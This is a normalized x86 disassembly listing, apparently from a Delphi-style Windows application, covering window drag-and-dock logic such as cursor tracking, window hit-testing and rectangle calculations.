push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449c14
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_449e98
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_4034a4
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_449ec4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_4034a4
xor edx edx
sub_449f1c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_454d20
sub_449f3c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_454d08
sub_449f60
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_449e48
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ac8
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42bc8c
mov edx eax
mov eax esi
call sub_424c44
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_449fc4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_449ff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449e6c
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_44a050
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_4034a4
pop edi
pop esi
pop ebp
retn 0x4
sub_44a074
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_44a098
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44a074
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44a074
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44a154
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_44a1c0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_44a610
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4496d4
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4530b8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4530b8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4530b8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_4034a4
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44a154
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4530b8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4530b8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_44a358
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4530b8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4530b8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_44a39c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_449bb0
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_44a1c0
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4188d4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4530b8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_44a358
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_4034a4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_451be8
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_449b20
sub_44a4f8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_418930
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4187c4
mov edx edi
mov eax [ rw-data ]
call sub_418778
jmp r-xdata
sub_44a558
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_44a5b0
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044f8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_4496a0
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_44a610
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44a5b0
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44a63c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_44a39c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_44a610
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_44a558
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4530b8
mov [ esi ] eax
sub_44a68c
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_44a558
cmp eax 0x1
sbb eax eax
inc eax
sub_44a6c8
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_451b54
test eax eax
je r-xdata
mov eax esi
call sub_451b54
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_44b0f8
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4188d4
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418930
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_451b68
mov edi eax
jmp r-xdata
sub_44a75c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_44a63c
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_454bdc
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_44a68c
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_44a68c
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_44c3b8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_44a68c
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46afe8
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_454b98
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_44a6c8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_4034a4
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_454cc4
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_454bdc
jmp r-xdata
mov eax [ rw-data ]
call sub_454d38
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46afe8
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_44c3b8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_4034a4
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_4034a4
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407fd4
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_44aa2c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_449c54
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_454bdc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_44a75c
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_44ab9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_44ad41
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_4034a4
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_4034a4
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_449f60
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44aa2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_449e48
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4530b8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_41725c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_44c38c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_41725c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_44ad60
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_4034a4
mov ebx eax
sub_44add4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44b0a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44b02e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_449c9c
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_44ad60
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_44a68c
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_454d38
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
